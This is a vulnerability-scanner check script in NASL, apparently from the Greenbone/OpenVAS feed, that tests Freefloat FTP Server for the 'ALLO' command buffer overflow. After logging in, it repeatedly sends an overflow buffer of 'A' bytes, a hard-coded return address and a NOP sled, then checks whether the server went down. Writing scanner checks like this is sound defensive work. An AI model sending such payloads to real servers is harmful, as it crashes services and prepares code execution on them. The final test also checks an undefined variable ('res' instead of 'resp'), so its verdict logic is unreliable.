if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103219" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-08-22 16:04:33 +0200 (Mon, 22 Aug 2011)" );
	script_bugtraq_id( 49265 );
	script_tag( name: "cvss_base", value: "5.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:P/I:P/A:P" );
	script_name( "Freefloat FTP Server 'ALLO' Command Remote Buffer Overflow Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49265" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_DENIAL );
	script_family( "Denial of Service" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/freefloat/detected" );
	script_tag( name: "summary", value: "Freefloat FTP Server is prone to a buffer-overflow vulnerability." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to execute arbitrary code within
  the context of the affected application. Failed exploit attempts will result in a denial-of-service condition." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of
  this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: port );
if(!banner || !ContainsString( banner, "FreeFloat" )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
banner = ftp_recv_line( socket: soc );
ftp_close( socket: soc );
if(!banner || !ContainsString( banner, "FreeFloat" )){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
junk1 = crap( data: raw_string( 0x41 ), length: 246 );
ret = raw_string( 0xED, 0x1E, 0x94, 0x7C );
nop = crap( data: raw_string( 0x90 ), length: 200 );
buff = junk1 + ret + nop;
for(i = 0;i < 10;i++){
	soc = open_sock_tcp( port );
	if( soc ){
		send( socket: soc, data: NASLString( "USER ", user, "\\r\\n" ) );
		recv = recv( socket: soc, length: 512 );
		send( socket: soc, data: NASLString( "PASS ", pass, "\\r\\n" ) );
		recv = recv( socket: soc, length: 512 );
		if(!ContainsString( recv, "230 User" )){
			break;
		}
		send( socket: soc, data: NASLString( "ALLO ", buff, "\\r\\n" ) );
	}
	else {
		break;
	}
}
close( soc );
sleep( 10 );
soc1 = open_sock_tcp( port );
if(!soc1){
	security_message( port: port );
	exit( 0 );
}
resp = recv_line( socket: soc1, length: 100 );
close( soc1 );
if(!res || !ContainsString( resp, "FreeFloat" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

